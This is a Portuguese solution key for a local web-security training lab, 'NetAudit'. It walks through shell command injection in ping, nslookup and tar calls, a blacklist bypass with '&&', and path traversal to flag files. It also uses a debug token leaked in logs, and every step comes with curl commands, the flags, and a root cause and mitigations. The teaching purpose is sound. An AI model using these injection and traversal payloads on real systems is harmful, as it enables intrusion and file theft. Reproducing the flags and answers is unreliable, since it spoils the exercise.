# Solution - Lab 03 NetAudit

Gabarito tecnico completo. Use apenas no ambiente local autorizado:

```text
http://127.0.0.1:8090
```

## Payloads principais

```text
target: 127.0.0.1; cat /app/flags/flag1.txt
target: localhost && cat /app/flags/flag2.txt
file: ../flags/flag3.txt
file: ../flags/flag4.txt
archiveName: backup.tar.gz; cat /app/flags/flag5.txt
archiveName: backup.tar.gz; cat /app/flags/root.txt
```

## Login

Credenciais:

```text
analyst:analyst123
```

Exemplo:

```bash
curl -s -c cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"username":"analyst","password":"analyst123"}' \
  http://127.0.0.1:8090/api/auth/login
```

## 1. Asset Check Command Injection

Fluxo manual:

1. No dashboard, clique em "Verificar" em qualquer ativo.
2. Capture a requisicao no Burp.
3. Envie para Repeater.
4. Altere apenas `target`.
5. Compare a resposta normal com a resposta adulterada.

Rota real:

```text
POST /api/assets/check
```

Body normal enviado pela UI:

```json
{
  "assetId": "gw-01",
  "checkType": "icmp",
  "target": "gateway.local"
}
```

Prova de execucao:

```json
{
  "assetId": "gw-01",
  "checkType": "icmp",
  "target": "127.0.0.1; whoami"
}
```

Leitura da flag:

```json
{
  "assetId": "gw-01",
  "checkType": "icmp",
  "target": "127.0.0.1; cat /app/flags/flag1.txt"
}
```

Curl opcional:

```bash
curl -s -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"assetId":"gw-01","checkType":"icmp","target":"127.0.0.1; cat /app/flags/flag1.txt"}' \
  http://127.0.0.1:8090/api/assets/check
```

Flag:

```text
FLAG{command_injection_ping_lab3}
```

Causa raiz: o backend confia em `target` enviado pelo cliente e monta:

```text
ping -c 2 ${target}
```

Mitigacao:

- nao confiar em `target` vindo do cliente;
- recalcular o hostname no servidor a partir de `assetId`;
- nao usar `exec` com concatenacao;
- usar `execFile` ou `spawn` com argumentos separados;
- validar allowlist de host/IP;
- executar a aplicacao com privilegios minimos.

## 2. Resolver Legado Escondido

Descoberta no JavaScript:

```js
const legacyAssetResolver = "/api/assets/resolve";
```

Rota:

```text
POST /api/assets/resolve
```

No Burp Repeater, monte uma requisicao manual usando o mesmo cookie `session` recebido no login.

Entrada normal:

```json
{
  "target": "localhost"
}
```

Filtro bloqueado:

```json
{
  "target": "localhost; whoami"
}
```

Bypass:

```json
{
  "target": "localhost && id"
}
```

Flag:

```json
{
  "target": "localhost && cat /app/flags/flag2.txt"
}
```

Curl opcional:

```bash
curl -s -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"target":"localhost && cat /app/flags/flag2.txt"}' \
  http://127.0.0.1:8090/api/assets/resolve
```

Flag:

```text
FLAG{weak_filter_bypass_lab3}
```

Causa raiz: blacklist fraca bloqueia apenas `;`, enquanto o backend executa:

```text
nslookup ${target}
```

Mitigacao:

- bloquear caracteres isolados nao e suficiente;
- usar `execFile("nslookup", [target])`;
- validar allowlist;
- remover shell da operacao.

## 3. Support Diagnostics e Logs

Descoberta:

```html
<!-- support diagnostics moved to /support.html after incident NT-2026-041 -->
```

Pagina:

```text
/support.html
```

Rota:

```text
GET /api/support/log?file=app.log
```

Pistas em `app.log`:

```text
support health endpoint moved to /api/internal/health
header expected: X-Support-Token
support token prefix: netaudit
support token middle: debug
support token suffix: 2026
backup route only exposed by internal healthcheck
archived incident evidence moved outside data directory
legacy resolver endpoint kept for support troubleshooting
```

Token:

```text
netaudit-debug-2026
```

Causa raiz: logs operacionais expostos vazam rotas internas, header e partes de segredo.

Mitigacao:

- nao vazar tokens em logs;
- mascarar dados sensiveis;
- restringir logs por autorizacao;
- rotacionar segredos vazados.

## 4. Path Traversal

O endpoint vulneravel usa `path.join("/app/data", file)` sem validar o caminho final.

Payloads:

```text
file=../flags/flag3.txt
file=../flags/flag4.txt
```

Flag3:

```bash
curl -s -b cookies.txt \
  "http://127.0.0.1:8090/api/support/log?file=../flags/flag3.txt"
```

```text
FLAG{logs_leaking_sensitive_info_lab3}
```

Flag4:

```bash
curl -s -b cookies.txt \
  "http://127.0.0.1:8090/api/support/log?file=../flags/flag4.txt"
```

```text
FLAG{path_traversal_log_viewer_lab3}
```

Mitigacao:

- usar allowlist de arquivos;
- normalizar com `path.resolve`;
- verificar se o caminho final permanece no diretorio permitido;
- nao aceitar caminhos arbitrarios do usuario.

## 5. Internal Health

Rota:

```text
GET /api/internal/health
```

Header:

```text
X-Support-Token: netaudit-debug-2026
```

Curl:

```bash
curl -s \
  -H "X-Support-Token: netaudit-debug-2026" \
  http://127.0.0.1:8090/api/internal/health
```

Resposta revela:

```json
{
  "status": "healthy",
  "service": "NetAudit",
  "environment": "production",
  "backupEndpoint": "/api/internal/backup",
  "method": "POST",
  "requiredParameter": "archiveName",
  "diagnosticFile": "/app/flags/flag5.txt"
}
```

Nao retorna flag diretamente.

Mitigacao:

- nao usar token estatico de debug;
- remover endpoints internos em producao;
- exigir autenticacao e autorizacao reais;
- segregar rotas administrativas.

## 6. Backup Command Injection

Rota:

```text
POST /api/internal/backup
```

Header:

```text
X-Support-Token: netaudit-debug-2026
```

Body normal:

```json
{
  "archiveName": "backup.tar.gz"
}
```

No Burp Repeater, crie a requisicao manualmente a partir dos metadados do health interno e mantenha o header de suporte.

Flag5:

```json
{
  "archiveName": "backup.tar.gz; cat /app/flags/flag5.txt"
}
```

Root:

```json
{
  "archiveName": "backup.tar.gz; cat /app/flags/root.txt"
}
```

Curl opcional:

```bash
curl -s -X POST http://127.0.0.1:8090/api/internal/backup \
  -H "Content-Type: application/json" \
  -H "X-Support-Token: netaudit-debug-2026" \
  -d '{"archiveName":"backup.tar.gz; cat /app/flags/root.txt"}'
```

Flags:

```text
FLAG{admin_route_exposed_by_debug_token}
FLAG{admin_backup_command_injection_lab3}
```

Causa raiz:

```text
tar -czf /tmp/${archiveName} /app/data
```

Mitigacao:

- gerar nome de arquivo no servidor;
- validar por allowlist;
- usar `execFile` ou `spawn`;
- separar permissoes do processo;
- nao manter segredos legiveis pelo processo web.

## Lista de flags

```text
FLAG{command_injection_ping_lab3}
FLAG{weak_filter_bypass_lab3}
FLAG{logs_leaking_sensitive_info_lab3}
FLAG{path_traversal_log_viewer_lab3}
FLAG{admin_route_exposed_by_debug_token}
FLAG{admin_backup_command_injection_lab3}
```
